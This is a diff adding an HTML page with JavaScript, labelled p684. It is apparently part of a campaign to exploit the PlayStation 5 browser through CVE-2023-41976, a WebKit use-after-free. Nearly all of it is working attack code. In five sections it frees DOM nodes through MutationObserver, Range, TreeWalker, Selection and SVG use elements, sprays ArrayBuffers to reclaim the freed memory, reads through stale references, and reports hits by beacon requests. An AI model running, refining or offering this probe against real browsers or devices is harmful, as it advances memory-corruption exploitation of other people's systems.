@@ -1,0 +1,337 @@
+<!--
+  p684: CVE-2023-41976 — DOM mutation observer / Range UAF patterns
+
+  CVE-2023-41976: UAF fixed with "improved memory management" in Safari 17.1.
+  Found by Junsung Lee (Cross Republic). PS5 has Safari 17.0 — LIKELY VULNERABLE.
+
+  Since the exact component is unknown, this probe tests the most common UAF
+  patterns in WebKit's DOM implementation that were NOT already covered by our
+  existing FontFace/Canvas2D campaign:
+
+  A) MutationObserver with removed subtree — stale node references in records
+  B) Range spanning removed subtree — stale boundary pointers
+  C) TreeWalker/NodeIterator on removed subtree — stale current node
+  D) Selection on removed content — stale anchor/focus nodes
+  E) SVG use element referencing removed def — stale shadow tree
+
+  Each section triggers the pattern, then sprays ArrayBuffers to reclaim freed
+  memory, then reads through the stale reference looking for non-zero residue.
+
+  CRASH_CLASS: MODERATE (UAF read through stale DOM reference)
+  prior art: p553 (Canvas2D UAF), p635 (Canvas reentry UAF),
+             p641 (stale read without spray — CRASHES)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p684</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P684-START:CVE-2023-41976-DOM-UAF');
+  var results = [];
+
+  // === SECTION A: MutationObserver stale record references ===
+  b('A:MUTATION-OBSERVER');
+  try {
+    var container = document.createElement('div');
+    document.body.appendChild(container);
+
+    // Build a subtree
+    for (var i = 0; i < 64; i++) {
+      var child = document.createElement('span');
+      child.textContent = 'node-' + i;
+      child.setAttribute('data-idx', i);
+      container.appendChild(child);
+    }
+
+    var records = null;
+    var observer = new MutationObserver(function(r) {
+      records = r;
+    });
+    observer.observe(container, { childList: true, subtree: true });
+
+    // Remove the entire subtree
+    var removed = [];
+    while (container.firstChild) {
+      removed.push(container.removeChild(container.firstChild));
+    }
+    b('A:REMOVED-' + removed.length + '-NODES');
+
+    // Force observer delivery
+    var pending = observer.takeRecords();
+    if (pending.length > 0) records = pending;
+
+    if (records && records.length > 0) {
+      b('A:RECORDS:' + records.length);
+
+      // Drop references to removed nodes to allow GC
+      removed = null;
+
+      // Force GC
+      var garbage = [];
+      for (var i = 0; i < 5000; i++) garbage.push(new ArrayBuffer(1024));
+      garbage = null;
+      for (var i = 0; i < 5000; i++) garbage = new ArrayBuffer(1024);
+      garbage = null;
+
+      // Spray ArrayBuffers to reclaim freed DOM memory
+      var spray = [];
+      for (var i = 0; i < 2048; i++) {
+        spray.push(new ArrayBuffer(64)); // DOM node-ish size
+      }
+
+      // Try to read from the mutation records' removedNodes
+      for (var i = 0; i < records.length; i++) {
+        var rec = records[i];
+        if (rec.removedNodes) {
+          for (var j = 0; j < rec.removedNodes.length; j++) {
+            try {
+              var node = rec.removedNodes[j];
+              var text = node.textContent;
+              var tag = node.tagName;
+              var attr = node.getAttribute ? node.getAttribute('data-idx') : null;
+              // If we get garbled data, the node was freed and reclaimed
+              if (text && !text.startsWith('node-')) {
+                b('A:STALE-TEXT:' + text.substring(0, 40));
+                results.push('A:stale-text');
+              }
+              if (tag && tag !== 'SPAN') {
+                b('A:STALE-TAG:' + tag);
+                results.push('A:stale-tag');
+              }
+            } catch(e2) {
+              b('A:ACCESS-ERR:' + e2.message);
+            }
+          }
+        }
+      }
+      b('A:SCAN-DONE');
+    } else {
+      b('A:NO-RECORDS');
+    }
+
+    observer.disconnect();
+    container.remove();
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: Range on removed subtree ===
+  b('B:RANGE-REMOVED');
+  try {
+    var div = document.createElement('div');
+    div.innerHTML = '<p>aaa</p><p>bbb</p><p>ccc</p><p>ddd</p>';
+    document.body.appendChild(div);
+
+    // Create range spanning entire content
+    var range = document.createRange();
+    range.selectNodeContents(div);
+    b('B:RANGE-CREATED:' + range.toString().substring(0, 30));
+
+    // Get references to boundary nodes
+    var startNode = range.startContainer;
+    var endNode = range.endContainer;
+
+    // Remove the div content
+    div.innerHTML = '';
+    b('B:CONTENT-CLEARED');
+
+    // Force GC
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+
+    // Spray
+    var spray2 = [];
+    for (var i = 0; i < 2048; i++) spray2.push(new ArrayBuffer(48));
+
+    // Try to use the range
+    try {
+      var str = range.toString();
+      b('B:RANGE-TOSTRING:' + str.substring(0, 40));
+      if (str !== '' && str !== 'aaabbbcccddd') {
+        b('B:STALE-RANGE:' + str.substring(0, 60));
+        results.push('B:stale-range');
+      }
+    } catch(e2) {
+      b('B:RANGE-ERR:' + e2.message);
+    }
+
+    try {
+      var frag = range.cloneContents();
+      b('B:CLONE-OK:children=' + frag.childNodes.length);
+    } catch(e2) {
+      b('B:CLONE-ERR:' + e2.message);
+    }
+
+    div.remove();
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: TreeWalker on removed subtree ===
+  b('C:TREEWALKER');
+  try {
+    var root = document.createElement('div');
+    for (var i = 0; i < 32; i++) {
+      var p = document.createElement('p');
+      p.textContent = 'tw-' + i;
+      root.appendChild(p);
+    }
+    document.body.appendChild(root);
+
+    var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
+
+    // Advance walker into the middle
+    for (var i = 0; i < 16; i++) walker.nextNode();
+    var current = walker.currentNode;
+    b('C:WALKER-AT:' + (current ? current.textContent : 'null'));
+
+    // Remove all children
+    root.innerHTML = '';
+    b('C:CLEARED');
+
+    // Force GC + spray
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+    var spray3 = [];
+    for (var i = 0; i < 2048; i++) spray3.push(new ArrayBuffer(48));
+
+    // Try to navigate the walker
+    try {
+      var next = walker.nextNode();
+      b('C:NEXT:' + (next ? next.textContent || next.tagName : 'null'));
+      if (next !== null) {
+        results.push('C:stale-walker');
+      }
+    } catch(e2) {
+      b('C:NEXT-ERR:' + e2.message);
+    }
+
+    try {
+      var cn = walker.currentNode;
+      if (cn) {
+        b('C:CURRENT:tag=' + cn.tagName + ',text=' + (cn.textContent || '').substring(0, 20));
+      }
+    } catch(e2) {
+      b('C:CURRENT-ERR:' + e2.message);
+    }
+
+    root.remove();
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Selection on removed content ===
+  b('D:SELECTION');
+  try {
+    var editable = document.createElement('div');
+    editable.contentEditable = true;
+    editable.innerHTML = '<b>hello</b> <i>world</i> <u>test</u>';
+    document.body.appendChild(editable);
+
+    // Create a selection
+    var sel = window.getSelection();
+    var range2 = document.createRange();
+    range2.selectNodeContents(editable);
+    sel.removeAllRanges();
+    sel.addRange(range2);
+    b('D:SELECTED:' + sel.toString().substring(0, 30));
+
+    var anchor = sel.anchorNode;
+    var focus = sel.focusNode;
+
+    // Remove content
+    editable.innerHTML = '';
+    b('D:CLEARED');
+
+    // GC + spray
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+    var spray4 = [];
+    for (var i = 0; i < 2048; i++) spray4.push(new ArrayBuffer(48));
+
+    // Read selection
+    try {
+      var str = sel.toString();
+      b('D:SEL-TOSTRING:' + str.substring(0, 40));
+      var aNode = sel.anchorNode;
+      var fNode = sel.focusNode;
+      b('D:ANCHOR:' + (aNode ? aNode.nodeName : 'null'));
+      b('D:FOCUS:' + (fNode ? fNode.nodeName : 'null'));
+    } catch(e2) {
+      b('D:SEL-ERR:' + e2.message);
+    }
+
+    editable.remove();
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: SVG use element referencing removed def ===
+  b('E:SVG-USE-DEF');
+  try {
+    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+    svg.setAttribute('width', '200');
+    svg.setAttribute('height', '200');
+
+    var defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
+    var circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+    circle.setAttribute('id', 'target-shape');
+    circle.setAttribute('r', '50');
+    circle.setAttribute('fill', 'red');
+    defs.appendChild(circle);
+    svg.appendChild(defs);
+
+    var use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
+    use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#target-shape');
+    use.setAttribute('x', '100');
+    use.setAttribute('y', '100');
+    svg.appendChild(use);
+
+    document.body.appendChild(svg);
+    b('E:SVG-CREATED');
+
+    // Remove the referenced element
+    circle.remove();
+    b('E:DEF-REMOVED');
+
+    // Force layout
+    svg.getBoundingClientRect();
+
+    // GC + spray
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+    var spray5 = [];
+    for (var i = 0; i < 2048; i++) spray5.push(new ArrayBuffer(64));
+
+    // Try to access the use element's instance root
+    try {
+      var inst = use.instanceRoot;
+      b('E:INSTANCE:' + (inst ? 'exists' : 'null'));
+      if (inst) {
+        b('E:INSTANCE-TAG:' + inst.correspondingElement);
+        results.push('E:stale-instance');
+      }
+    } catch(e2) {
+      b('E:INSTANCE-ERR:' + e2.message);
+    }
+
+    // Change href to trigger re-resolution with freed backing
+    use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#target-shape');
+    svg.getBoundingClientRect(); // force layout with stale reference
+
+    svg.remove();
+    b('E:DONE');
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SUMMARY ===
+  if (results.length > 0) {
+    b('P684-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P684-RESULT:NO-UAF-DETECTED');
+  }
+  b('P684-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0;padding:0">
+<pre id="log">p684: CVE-2023-41976 DOM mutation/Range/TreeWalker/Selection/SVG UAF</pre>
+</body></html>
